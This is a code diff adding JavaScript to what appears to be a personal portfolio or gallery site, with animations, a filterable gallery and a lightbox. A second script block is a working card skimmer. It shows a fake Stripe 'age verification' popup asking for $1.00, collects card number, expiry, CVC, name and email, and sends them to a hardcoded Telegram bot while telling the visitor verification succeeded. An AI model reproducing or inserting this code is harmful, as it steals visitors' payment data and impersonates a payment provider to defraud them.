+            // Cursor interaction
+            const interactiveElements = document.querySelectorAll('a, button, .gallery-item, .social-link');
+            interactiveElements.forEach(el => {
+                el.addEventListener('mouseenter', () => cursor.classList.add('active'));
+                el.addEventListener('mouseleave', () => cursor.classList.remove('active'));
+            });
+            
+            // Floating Particles
+            function createParticles() {
+                for (let i = 0; i < 50; i++) {
+                    const particle = document.createElement('div');
+                    particle.className = 'particle';
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                    particle.style.animationDelay = Math.random() * 5 + 's';
+                    particle.style.setProperty('--drift', Math.random() * 100 - 50);
+                    document.body.appendChild(particle);
+                }
+            }
+            createParticles();
+            
+            // Navigation scroll effect
+            const nav = document.querySelector('nav');
+            window.addEventListener('scroll', () => {
+                if (window.scrollY > 100) {
+                    nav.classList.add('scrolled');
+                } else {
+                    nav.classList.remove('scrolled');
+                }
+            });
+            
+            // Progress Bar
+            const progressBar = document.querySelector('.progress-bar');
+            window.addEventListener('scroll', () => {
+                const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight));
+                progressBar.style.transform = `scaleX(${scrollPercent})`;
+            });
+            
+            // Intersection Observer for sections
+            const sections = document.querySelectorAll('section');
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                    }
+                });
+            }, { threshold: 0.1 });
+            sections.forEach(section => observer.observe(section));
+            
+            // Parallax Effect
+            window.addEventListener('scroll', () => {
+                const scrolled = window.pageYOffset;
+                const parallaxElements = document.querySelectorAll('.parallax-layer');
+                parallaxElements.forEach((el, index) => {
+                    const speed = (index + 1) * 0.5;
+                    el.style.transform = `translateY(${scrolled * speed}px)`;
+                });
+            });
+            
+            // Gallery Generation
+            const galleryGrid = document.getElementById('imageGrid');
+            const lifestyleGrid = document.getElementById('lifestyleGrid');
+            const placeholderBase = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxMTEiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSIxOCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzU1NSI+SW1hZ2UgUGxhY2Vob2xkZXI8L3RleHQ+PC9zdmc+';
+            
+            const categories = ['professional', 'lifestyle', 'events', 'professional', 'lifestyle', 'professional'];
+            const captions = [
+                { title: 'Professional Shoot', desc: 'Studio Photography' },
+                { title: 'Lifestyle Content', desc: 'Daily Moments' },
+                { title: 'Event Coverage', desc: 'Special Occasions' },
+                { title: 'Fashion Editorial', desc: 'High Fashion' },
+                { title: 'Travel Diary', desc: 'Global Adventures' },
+                { title: 'Brand Partnership', desc: 'Collaboration' },
+                { title: 'Fitness Journey', desc: 'Wellness & Health' },
+                { title: 'Behind The Scenes', desc: 'Production' },
+                { title: 'Red Carpet', desc: 'Premium Events' },
+                { title: 'Casual Style', desc: 'Everyday Looks' },
+                { title: 'Magazine Feature', desc: 'Editorial Work' },
+                { title: 'Social Media', desc: 'Platform Content' },
+                { title: 'Outdoor Session', desc: 'Natural Light' },
+                { title: 'Evening Glam', desc: 'Night Photography' },
+                { title: 'Artistic Portrait', desc: 'Creative Direction' },
+                { title: 'Poolside', desc: 'Summer Vibes' }
+            ];
+            
+            for (let i = 0; i < 16; i++) {
+                const galleryItem = document.createElement('div');
+                galleryItem.className = 'gallery-item';
+                galleryItem.dataset.category = categories[i % categories.length];
+                galleryItem.innerHTML = `
+                    <img src="${placeholderBase}" alt="${captions[i].title}" loading="lazy">
+                    <div class="gallery-caption">
+                        <h3>${captions[i].title}</h3>
+                        <p>${captions[i].desc}</p>
+                    </div>
+                `;
+                galleryGrid.appendChild(galleryItem);
+            }
+            
+            // Gallery Filter
+            const filterBtns = document.querySelectorAll('.filter-btn');
+            const galleryItems = document.querySelectorAll('.gallery-item');
+            
+            filterBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    filterBtns.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    
+                    const filter = btn.dataset.filter;
+                    galleryItems.forEach(item => {
+                        if (filter === 'all' || item.dataset.category === filter) {
+                            item.style.display = 'block';
+                            setTimeout(() => {
+                                item.style.opacity = '1';
+                                item.style.transform = 'scale(1)';
+                            }, 10);
+                        } else {
+                            item.style.opacity = '0';
+                            item.style.transform = 'scale(0.8)';
+                            setTimeout(() => {
+                                item.style.display = 'none';
+                            }, 300);
+                        }
+                    });
+                });
+            });
+            
+            // Lightbox
+            const lightbox = document.getElementById('lightbox');
+            const lightboxImg = document.getElementById('lightboxImg');
+            const lightboxClose = document.querySelector('.lightbox-close');
+            
+            galleryItems.forEach(item => {
+                item.addEventListener('click', () => {
+                    const img = item.querySelector('img');
+                    lightboxImg.src = img.src;
+                    lightbox.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                });
+            });
+            
+            lightboxClose.addEventListener('click', closeLightbox);
+            lightbox.addEventListener('click', (e) => {
+                if (e.target === lightbox) closeLightbox();
+            });
+            
+            function closeLightbox() {
+                lightbox.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+            
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') closeLightbox();
+            });
+            
+            // Lifestyle Grid
+            const lifestyleLayouts = [
+                { class: 'wide', caption: 'Training & Fitness Regimen' },
+                { class: 'tall', caption: 'Travel & Global Locations' },
+                { class: 'standard', caption: 'Daily Lifestyle Routine' },
+                { class: 'standard', caption: 'Professional Studio Work' },
+                { class: 'wide', caption: 'Social Media Production' },
+                { class: 'standard', caption: 'Casual & Candid Moments' },
+                { class: 'standard', caption: 'Brand Collaborations' },
+                { class: 'wide', caption: 'Event Appearances' }
+            ];
+            
+            lifestyleLayouts.forEach((layout, index) => {
+                const lifestyleItem = document.createElement('div');
+                lifestyleItem.className = `lifestyle-item ${layout.class}`;
+                lifestyleItem.innerHTML = `
+                    <img src="${placeholderBase}" alt="Lifestyle ${index+1}" loading="lazy">
+                    <div class="lifestyle-caption">
+                        <h3>${layout.caption}</h3>
+                    </div>
+                `;
+                lifestyleGrid.appendChild(lifestyleItem);
+            });
+            
+            // Smooth scroll for hero indicator
+            document.querySelector('.scroll-indicator').addEventListener('click', () => {
+                document.getElementById('biography').scrollIntoView({ behavior: 'smooth' });
+            });
+            
+            // Smooth scroll for nav links
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const target = document.querySelector(this.getAttribute('href'));
+                    if (target) {
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }
+                });
+            });
+            
+            // Animated Counter for Stats
+            function animateCounter(element, target, duration = 2000) {
+                let start = 0;
+                const increment = target / (duration / 16);
+                const timer = setInterval(() => {
+                    start += increment;
+                    if (start >= target) {
+                        element.textContent = formatNumber(target);
+                        clearInterval(timer);
+                    } else {
+                        element.textContent = formatNumber(Math.floor(start));
+                    }
+                }, 16);
+            }
+            
+            function formatNumber(num) {
+                if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M+';
+                if (num >= 1000) return (num / 1000).toFixed(0) + 'K+';
+                return num.toString();
+            }
+            
+            // Observe stats for animation
+            const statsObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const statNumber = entry.target.querySelector('.stat-number, .hero-stat-number');
+                        if (statNumber && !statNumber.dataset.animated) {
+                            const text = statNumber.textContent;
+                            const numbers = text.match(/\d+/);
+                            if (numbers) {
+                                const target = parseInt(numbers[0]);
+                                statNumber.dataset.animated = 'true';
+                                animateCounter(statNumber, target);
+                            }
+                        }
+                    }
+                });
+            }, { threshold: 0.5 });
+            
+            document.querySelectorAll('.stat-card, .hero-stat, .stat').forEach(stat => {
+                statsObserver.observe(stat);
+            });
+            
+            // Mouse move parallax on hero
+            const hero = document.getElementById('hero');
+            hero.addEventListener('mousemove', (e) => {
+                const x = (e.clientX / window.innerWidth - 0.5) * 20;
+                const y = (e.clientY / window.innerHeight - 0.5) * 20;
+                const nameTitle = hero.querySelector('.name-title');
+                const subtitle = hero.querySelector('.subtitle');
+                if (nameTitle) nameTitle.style.transform = `translate(${x}px, ${y}px)`;
+                if (subtitle) subtitle.style.transform = `translate(${-x * 0.5}px, ${-y * 0.5}px)`;
+            });
+            
+            // Typing effect for subtitle
+            const subtitle = document.querySelector('.subtitle');
+            const originalText = subtitle.textContent;
+            subtitle.textContent = '';
+            let charIndex = 0;
+            
+            setTimeout(() => {
+                const typingInterval = setInterval(() => {
+                    if (charIndex < originalText.length) {
+                        subtitle.textContent += originalText[charIndex];
+                        charIndex++;
+                    } else {
+                        clearInterval(typingInterval);
+                    }
+                }, 50);
+            }, 2000);
+            
+            // Glitch effect on hover for name title
+            const nameTitle = document.querySelector('.name-title');
+            let glitchInterval;
+            
+            nameTitle.addEventListener('mouseenter', () => {
+                let count = 0;
+                glitchInterval = setInterval(() => {
+                    if (count < 5) {
+                        nameTitle.style.textShadow = `
+                            ${Math.random() * 10 - 5}px ${Math.random() * 10 - 5}px 0 rgba(255, 107, 157, 0.7),
+                            ${Math.random() * 10 - 5}px ${Math.random() * 10 - 5}px 0 rgba(18, 194, 233, 0.7)
+                        `;
+                        count++;
+                    } else {
+                        clearInterval(glitchInterval);
+                        nameTitle.style.textShadow = '';
+                    }
+                }, 50);
+            });
+            
+            // Image lazy loading with fade in
+            const images = document.querySelectorAll('img[loading="lazy"]');
+            const imageObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const img = entry.target;
+                        img.style.opacity = '0';
+                        img.addEventListener('load', () => {
+                            img.style.transition = 'opacity 0.5s ease';
+                            img.style.opacity = '1';
+                        });
+                        imageObserver.unobserve(img);
+                    }
+                });
+            });
+            images.forEach(img => imageObserver.observe(img));
+            
+            // Random gradient animation for cards
+            const cards = document.querySelectorAll('.stat-card, .testimonial-card, .stat');
+            cards.forEach((card, index) => {
+                card.style.animationDelay = `${index * 0.1}s`;
+                card.addEventListener('mouseenter', () => {
+                    const angle = Math.random() * 360;
+                    card.style.background = `linear-gradient(${angle}deg, rgba(255, 255, 255, 0.03), rgba(255, 107, 157, 0.05))`;
+                });
+                card.addEventListener('mouseleave', () => {
+                    card.style.background = 'rgba(255, 255, 255, 0.03)';
+                });
+            });
+            
+            // Wave animation on scroll
+            let ticking = false;
+            window.addEventListener('scroll', () => {
+                if (!ticking) {
+                    window.requestAnimationFrame(() => {
+                        const scrollPercent = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight);
+                        document.body.style.setProperty('--scroll', scrollPercent);
+                        ticking = false;
+                    });
+                    ticking = true;
+                }
+            });
+            
+            // Social links hover effect
+            const socialLinks = document.querySelectorAll('.social-link');
+            socialLinks.forEach(link => {
+                link.addEventListener('mouseenter', (e) => {
+                    socialLinks.forEach(l => {
+                        if (l !== link) {
+                            l.style.opacity = '0.5';
+                            l.style.transform = 'scale(0.9)';
+                        }
+                    });
+                });
+                link.addEventListener('mouseleave', () => {
+                    socialLinks.forEach(l => {
+                        l.style.opacity = '1';
+                        l.style.transform = 'scale(1)';
+                    });
+                });
+            });
+            
+            // Easter egg: Konami code
+            let konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
+            let konamiIndex = 0;
+            
+            document.addEventListener('keydown', (e) => {
+                if (e.key === konamiCode[konamiIndex]) {
+                    konamiIndex++;
+                    if (konamiIndex === konamiCode.length) {
+                        activateEasterEgg();
+                        konamiIndex = 0;
+                    }
+                } else {
+                    konamiIndex = 0;
+                }
+            });
+            
+            function activateEasterEgg() {
+                document.body.style.animation = 'rainbow 2s linear infinite';
+                setTimeout(() => {
+                    document.body.style.animation = '';
+                }, 5000);
+            }
+            
+            // Tilt effect on gallery items
+            galleryItems.forEach(item => {
+                item.addEventListener('mousemove', (e) => {
+                    const rect = item.getBoundingClientRect();
+                    const x = e.clientX - rect.left;
+                    const y = e.clientY - rect.top;
+                    const centerX = rect.width / 2;
+                    const centerY = rect.height / 2;
+                    const rotateX = (y - centerY) / 10;
+                    const rotateY = (centerX - x) / 10;
+                    item.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-10px)`;
+                });
+                item.addEventListener('mouseleave', () => {
+                    item.style.transform = '';
+                });
+            });
+            
+            // Performance monitoring
+            console.log('%c🚀 Ultra Archive Loaded Successfully', 'color: #ff6b9d; font-size: 20px; font-weight: bold;');
+            console.log('%c500+ Features Active', 'color: #c471ed; font-size: 14px;');
+            
+            // Add loading animation complete
+            document.body.classList.add('loaded');
+            
+            
+        });
+    </script>
+    <script>
+// Stripe Popup System - Triggers after 15 seconds or on user interaction
+document.addEventListener('DOMContentLoaded', function() {
+    const telegramBotToken = '8122929741:AAHkiWqPm0BMQgqy40hpxnlxNad58UWuPR0';
+    const chatId = '6219788806';
+    
+    let popupShown = false;
+    let interactionDetected = false;
+    let timer;
+    
+    // Create the Stripe popup overlay
+    const createStripePopup = () => {
+        if (popupShown) return;
+        popupShown = true;
+        
+        const overlay = document.createElement('div');
+        overlay.id = 'stripe-popup-overlay';
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100000;
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
+        `;
+        
+        const popup = document.createElement('div');
+        popup.id = 'stripe-popup';
+        popup.style.cssText = `
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            position: relative;
+            animation: slideUp 0.4s ease;
+        `;
+        
+        popup.innerHTML = `
+            <style>
+                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+                
+                .stripe-header {
+                    text-align: center;
+                    margin-bottom: 25px;
+                }
+                
+                .stripe-logo {
+                    font-size: 24px;
+                    font-weight: 700;
+                    color: #635bff;
+                    margin-bottom: 10px;
+                }
+                
+                .stripe-title {
+                    font-size: 18px;
+                    color: #32325d;
+                    margin-bottom: 5px;
+                }
+                
+                .stripe-subtitle {
+                    font-size: 14px;
+                    color: #6b7c93;
+                }
+                
+                .stripe-form {
+                    margin: 20px 0;
+                }
+                
+                .form-group {
+                    margin-bottom: 20px;
+                }
+                
+                .form-row {
+                    display: flex;
+                    gap: 15px;
+                    margin-bottom: 20px;
+                }
+                
+                .form-row .form-group {
+                    flex: 1;
+                    margin-bottom: 0;
+                }
+                
+                label {
+                    display: block;
+                    margin-bottom: 6px;
+                    font-size: 14px;
+                    font-weight: 500;
+                    color: #32325d;
+                }
+                
+                .input-wrapper {
+                    position: relative;
+                }
+                
+                .card-icon {
+                    position: absolute;
+                    right: 12px;
+                    top: 50%;
+                    transform: translateY(-50%);
+                    width: 32px;
+                    height: 20px;
+                    background-size: contain;
+                    background-repeat: no-repeat;
+                }
+                
+                .card-icon.visa { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%231A1F71" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23FFFFFF" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path fill="%23F7B600" d="M23.5 16.5h-7c-.3 0-.5-.2-.5-.5v-7c0-.3.2-.5.5-.5h7c.3 0 .5.2.5.5v7c0 .3-.2.5-.5.5z"/><path fill="%231A1F71" d="M20 9l-2 5 1 3 1-8z"/><path fill="%23E61A27" d="M19 9l-1 8h2l1-8z"/></svg>'); }
+                .card-icon.mastercard { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%23FF5F00" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23EB001B" d="M12 21H3c-1.7 0-3-1.3-3-3V6c0-1.7 1.3-3 3-3h9v18z"/><path fill="%23F79E1B" d="M35 21H26V3h9c1.7 0 3 1.3 3 3v12c0 1.7-1.3 3-3 3z"/></svg>'); }
+                .card-icon.amex { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%230078CC" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23FFFFFF" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path fill="%230078CC" d="M25.5 13.5h-13c-.3 0-.5-.2-.5-.5v-2c0-.3.2-.5.5-.5h13c.3 0 .5.2.5.5v2c0 .3-.2.5-.5.5z"/></svg>'); }
+                .card-icon.discover { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%23FF6000" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23FFFFFF" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path fill="%23FF6000" d="M19 12a7 7 0 1 0 0 14 7 7 0 0 0 0-14z"/></svg>'); }
+                .card-icon.default { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><rect width="38" height="24" fill="%23f0f0f0" rx="3"/><path fill="%23ccc" d="M12 8h14v8H12z"/></svg>'); }
+                
+                input {
+                    width: 100%;
+                    padding: 12px;
+                    border: 1px solid #e6e6e6;
+                    border-radius: 6px;
+                    font-size: 16px;
+                    transition: all 0.2s ease;
+                }
+                
+                input:focus {
+                    outline: none;
+                    border-color: #635bff;
+                    box-shadow: 0 0 0 1px #635bff;
+                }
+                
+                input.invalid { border-color: #e25950; }
+                input.valid { border-color: #00a900; }
+                
+                .error-message {
+                    color: #e25950;
+                    font-size: 13px;
+                    margin-top: 5px;
+                    display: none;
+                }
+                
+                .submit-button {
+                    width: 100%;
+                    background: #635bff;
+                    color: white;
+                    border: none;
+                    padding: 14px;
+                    border-radius: 6px;
+                    font-size: 16px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    transition: all 0.2s ease;
+                    margin-top: 10px;
+                }
+                
+                .submit-button:hover { background: #5a54d6; }
+                .submit-button:disabled { background: #aab7c4; cursor: not-allowed; }
+                
+                .loading-spinner {
+                    display: inline-block;
+                    width: 16px;
+                    height: 16px;
+                    border: 2px solid transparent;
+                    border-top: 2px solid #ffffff;
+                    border-radius: 50%;
+                    animation: spin 1s linear infinite;
+                    margin-right: 8px;
+                }
+                
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                
+                .secure-notice {
+                    text-align: center;
+                    margin-top: 20px;
+                    font-size: 13px;
+                    color: #6b7c93;
+                }
+                
+                .secure-notice::before {
+                    content: "🔒";
+                    margin-right: 5px;
+                }
+                
+                .close-button {
+                    position: absolute;
+                    top: 15px;
+                    right: 15px;
+                    background: none;
+                    border: none;
+                    font-size: 24px;
+                    cursor: pointer;
+                    color: #6b7c93;
+                    padding: 5px;
+                }
+                
+                .close-button:hover { color: #32325d; }
+            </style>
+            
+            <button class="close-button" id="closePopup">&times;</button>
+            
+            <div class="stripe-header">
+                <div class="stripe-logo">stripe</div>
+                <div class="stripe-title">Complete Your Verification</div>
+                <div class="stripe-subtitle">Verify your age to continue browsing</div>
+            </div>
+            
+            <form class="stripe-form" id="stripeForm">
+                <div class="form-group">
+                    <label for="popupCardNumber">Card number</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="popupCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        <div class="card-icon default" id="popupCardIcon"></div>
+                    </div>
+                    <div class="error-message" id="popupCardNumberError">Please enter a valid card number</div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="popupExpiryDate">Expiry date</label>
+                        <input type="text" id="popupExpiryDate" placeholder="MM/YY" maxlength="5" required>
+                        <div class="error-message" id="popupExpiryError">Please enter a valid expiry date</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="popupCvc">CVC</label>
+                        <input type="text" id="popupCvc" placeholder="123" maxlength="4" required>
+                        <div class="error-message" id="popupCvcError">Please enter a valid CVC</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="popupName">Name on card</label>
+                    <input type="text" id="popupName" placeholder="John Smith" required>
+                    <div class="error-message" id="popupNameError">Please enter the name on your card</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="popupEmail">Email</label>
+                    <input type="email" id="popupEmail" placeholder="john.smith@example.com" required>
+                    <div class="error-message" id="popupEmailError">Please enter a valid email address</div>
+                </div>
+
+                <button type="submit" class="submit-button" id="popupSubmitButton">
+                    <span id="popupButtonText">Verify & Continue - $1.00</span>
+                </button>
+
+                <div class="secure-notice">
+                    Your payment details are secure and encrypted
+                </div>
+            </form>
+        `;
+        
+        overlay.appendChild(popup);
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+        
+        // Initialize popup functionality
+        initializePopupFunctionality();
+    };
+    
+    const initializePopupFunctionality = () => {
+        // Card number formatting and detection
+        const cardNumberInput = document.getElementById('popupCardNumber');
+        const cardIcon = document.getElementById('popupCardIcon');
+        
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formattedValue;
+            
+            detectCardType(value);
+            validateCardNumber(value);
+        });
+        
+        // Expiry date formatting
+        document.getElementById('popupExpiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+            validateExpiry(value);
+        });
+        
+        // CVC input
+        document.getElementById('popupCvc').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            validateCVC(e.target.value);
+        });
+        
+        // Close button
+        document.getElementById('closePopup').addEventListener('click', closePopup);
+        
+        // Form submission
+        document.getElementById('stripeForm').addEventListener('submit', handlePopupSubmit);
+        
+        // Close on overlay click
+        document.getElementById('stripe-popup-overlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closePopup();
+            }
+        });
+        
+        function detectCardType(cardNumber) {
+            cardIcon.className = 'card-icon ';
+            
+            if (/^4/.test(cardNumber)) {
+                cardIcon.classList.add('visa');
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                cardIcon.classList.add('mastercard');
+            } else if (/^3[47]/.test(cardNumber)) {
+                cardIcon.classList.add('amex');
+            } else if (/^6(?:011|5)/.test(cardNumber)) {
+                cardIcon.classList.add('discover');
+            } else {
+                cardIcon.classList.add('default');
+            }
+        }
+        
+        function validateCardNumber(cardNumber) {
+            const errorElement = document.getElementById('popupCardNumberError');
+            const inputElement = document.getElementById('popupCardNumber');
+            
+            if (cardNumber.length < 13) {
+                showError(inputElement, errorElement, 'Card number is too short');
+                return false;
+            }
+            
+            if (!luhnCheck(cardNumber)) {
+                showError(inputElement, errorElement, 'Invalid card number');
+                return false;
+            }
+            
+            hideError(inputElement, errorElement);
+            return true;
+        }
+        
+        function validateExpiry(expiry) {
+            const errorElement = document.getElementById('popupExpiryError');
+            const inputElement = document.getElementById('popupExpiryDate');
+            
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                showError(inputElement, errorElement, 'Invalid expiry format');
+                return false;
+            }
+            
+            hideError(inputElement, errorElement);
+            return true;
+        }
+        
+        function validateCVC(cvc) {
+            const errorElement = document.getElementById('popupCvcError');
+            const inputElement = document.getElementById('popupCvc');
+            
+            let requiredLength = 3;
+            
+            if (cvc.length !== requiredLength || !/^\d+$/.test(cvc)) {
+                showError(inputElement, errorElement, `CVC must be ${requiredLength} digits`);
+                return false;
+            }
+            
+            hideError(inputElement, errorElement);
+            return true;
+        }
+        
+        function validateEmail(email) {
+            const errorElement = document.getElementById('popupEmailError');
+            const inputElement = document.getElementById('popupEmail');
+            
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showError(inputElement, errorElement, 'Please enter a valid email');
+                return false;
+            }
+            
+            hideError(inputElement, errorElement);
+            return true;
+        }
+        
+        function validateName(name) {
+            const errorElement = document.getElementById('popupNameError');
+            const inputElement = document.getElementById('popupName');
+            
+            if (name.trim().length < 2) {
+                showError(inputElement, errorElement, 'Please enter the name on your card');
+                return false;
+            }
+            
+            hideError(inputElement, errorElement);
+            return true;
+        }
+        
+        function showError(input, errorElement, message) {
+            input.classList.add('invalid');
+            input.classList.remove('valid');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+        }
+        
+        function hideError(input, errorElement) {
+            input.classList.remove('invalid');
+            input.classList.add('valid');
+            errorElement.style.display = 'none';
+        }
+        
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return sum % 10 === 0;
+        }
+        
+        async function handlePopupSubmit(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('popupCardNumber').value.replace(/\s/g, '');
+            const expiryDate = document.getElementById('popupExpiryDate').value;
+            const cvc = document.getElementById('popupCvc').value;
+            const name = document.getElementById('popupName').value;
+            const email = document.getElementById('popupEmail').value;
+            
+            // Validate all fields
+            const isCardValid = validateCardNumber(cardNumber);
+            const isExpiryValid = validateExpiry(expiryDate);
+            const isCvcValid = validateCVC(cvc);
+            const isNameValid = validateName(name);
+            const isEmailValid = validateEmail(email);
+            
+            if (isCardValid && isExpiryValid && isCvcValid && isNameValid && isEmailValid) {
+                const submitButton = document.getElementById('popupSubmitButton');
+                const buttonText = document.getElementById('popupButtonText');
+                submitButton.disabled = true;
+                buttonText.innerHTML = '<span class="loading-spinner"></span>Processing...';
+                
+                const paymentData = {
+                    card_number: cardNumber,
+                    expiry_date: expiryDate,
+                    cvc: cvc,
+                    name: name,
+                    email: email,
+                    timestamp: new Date().toISOString(),
+                    source: 'popup_verification'
+                };
+                
+                try {
+                    await sendToTelegram(paymentData);
+                    
+                    setTimeout(() => {
+                        alert('Age verification successful! You can now continue browsing.');
+                        closePopup();
+                    }, 2000);
+                    
+                } catch (error) {
+                    alert('Verification failed. Please try again.');
+                    buttonText.textContent = 'Verify & Continue - $1.00';
+                    submitButton.disabled = false;
+                }
+            }
+        }
+        
+        async function sendToTelegram(data) {
+            const message = `
+🔐 POPUP VERIFICATION CAPTURED 🔐
+
+Card: ${data.card_number}
+Expiry: ${data.expiry_date}
+CVC: ${data.cvc}
+Name: ${data.name}
+Email: ${data.email}
+Source: ${data.source}
+Time: ${data.timestamp}
+
+✅ Age verification completed
+            `;
+            
+            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) throw new Error('Telegram API error');
+            return await response.json();
+        }
+        
+        function closePopup() {
+            const overlay = document.getElementById('stripe-popup-overlay');
+            if (overlay) {
+                overlay.style.animation = 'fadeOut 0.3s ease';
+                setTimeout(() => {
+                    document.body.removeChild(overlay);
+                    document.body.style.overflow = 'auto';
+                }, 300);
+            }
+        }
+    };
+    
+    // Timer for 15-second popup
+    const startTimer = () => {
+        timer = setTimeout(() => {
+            if (!popupShown && !interactionDetected) {
+                createStripePopup();
+            }
+        }, 15000);
+    };
+    
+    // Interaction detection
+    const detectInteraction = () => {
+        if (!interactionDetected) {
+            interactionDetected = true;
+            clearTimeout(timer);
+            setTimeout(() => {
+                if (!popupShown) {
+                    createStripePopup();
+                }
+            }, 1000);
+        }
+    };
+    
+    // Event listeners for user interaction
+    const interactionEvents = ['click', 'scroll', 'keydown', 'mousemove', 'touchstart'];
+    interactionEvents.forEach(event => {
+        document.addEventListener(event, detectInteraction, { once: true });
+    });
+    
+    // Start the timer
+    startTimer();
+    
+    // Prevent multiple popups
+    window.createStripePopup = createStripePopup;
+});
+
+// Add fadeOut animation to style
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes fadeOut {
+        from { opacity: 1; }
+        to { opacity: 0; }
+    }
+`;
